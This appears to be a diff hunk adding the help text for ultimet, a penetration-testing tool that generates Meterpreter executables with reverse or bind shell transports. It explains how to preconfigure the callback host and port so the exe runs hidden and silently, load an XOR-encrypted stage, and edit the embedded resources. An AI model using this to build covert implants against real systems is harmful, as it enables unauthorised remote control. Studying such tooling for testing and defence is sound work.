@@ -34,3 +34,82 @@ c:\>reverse_http-192.168.59.132-8080.exe --reset
 
 [*] Creating a `clean` ultimet copy with all options reset to default ...
 [*] Success! use `ultimet_reset.exe` for a fresh start...
+
+====================================================
+c:>ultimet --help
+
+****************************************************
+[+] [ultimet] - The Ultimate Meterpreter Executable
+[+] v0.25.1 - Revolution
+****************************************************
+  -  http://eldeeb.net - @SheriefEldeeb
+
+Usage:
+utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] [--msfpayload]
+                                                 [--remove-stage] [--reset]
+
+Connection settings:
+        -h      LHOST   IP or a hostname.
+        -p      LPORT   Port number."
+        -t      TRANSPORT "reverse_tcp", "reverse_metsvc", "reverse_http",
+                          "reverse_https","bind_tcp" or "bind_metsvc"
+
+HTTP(S) Specific settings `optional`:
+        -ua     U_AGENT User-Agent, enclose in `""` if contains spaces.
+        -et     SECONDS Session expiration timeout in seconds.
+        -ct     SECONDS Communication expiration timeout in seconds.
+
+MSFPAYLOAD-like functionality:
+        --msfpayload    When this is specified along with the connection
+                        parameters, new exe will be created with the following
+                        naming convention:TRANSPORT-LHOST-LPORT.exe,
+                        this newly created exe will execute silently according
+                        to the predefined settings.
+                         ... it's gonna be just like the exe files you get out
+                         of msfpayload ... on steroids :)
+        --reset         A new exe will be created `ultimet_reset.exe` with
+                        pre-defined settings cleared `undo -> --msfpayload`.
+
+Stage options:
+        -f      FILE    Forces loading the stage from a file.
+                        Note: The file can be a regular metsrv.dll,
+                        or an encrypted one using the ultimet_xor.exe utility.
+        --remove-stage  Creates a new exe `ultimet_no_stage.exe` with stage
+                        resource removed, it will resut in smaller file, but
+                        metsvc family of payloads won't be available.
+                        To re-attach the resource ... use a resource editor.
+
+General notes:
+ - If you find the console window disappears immediatly when you run ultimet,
+   this means it found valid connection settings built-in, to get rid of this
+   behaviour, `ultimet.exe --reset` will create a pristine `ultimet_reset.exe`.
+ - The exe file created with `--msfpayload` option is a fully functional
+   ultimet.exe, it will run hidden and doesn't require connection parameters
+   to be specified since they're preconfigured, to reset that exe to its norm,
+   just specify `--reset` and a fresh exe will be created with default settings
+ - If you're on a shell [not a console], you have to start the program using:
+   "start /b ultimet.exe ..." or you'll lose your shell.
+ - For the reverse_metsvc & bind_metsvc options, stage has to be available
+   upfront, either through the bundled resource or loaded usng the "-f" option
+ - The most reliable handler for reverse_metsvc is:
+   "windows/metsvc_reverse_tcp" ... using reverse_metsvc to connect to a
+   "reverse_tcp" *might* work, but not always, so, use reverse_metsvc with
+   windows/metsvc_reverse_tcp ... same applies to bind_metsv.
+
+Advanced notes:
+ - ultimet utilizes resources to include the stage, and to store connection
+   settings internally.
+ - The stage `metsvc.dll` is stored in a resource `BINARY` and ID `101`,
+   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe
+   utility.
+ - Options are stored in a resource `BINARY` and ID `103` using the following
+   convention: `|UM|TRANSPORT|LHOST|LPORT|` <- leave "|UM|" as it is since
+   it's used inernally, and change connection settings as you like.
+ - You can use your favourite resource editor to create/edit those resources as
+   you please.
+
+Contributors:
+ - Anwar Mohamed "@anwarelmakrahy"
+   . Added support for metsvc_bind_tcp & bind_tcp.
+   . Added support for run-time parsing and patching of ReflectiveLoader
+     Bootstrap.
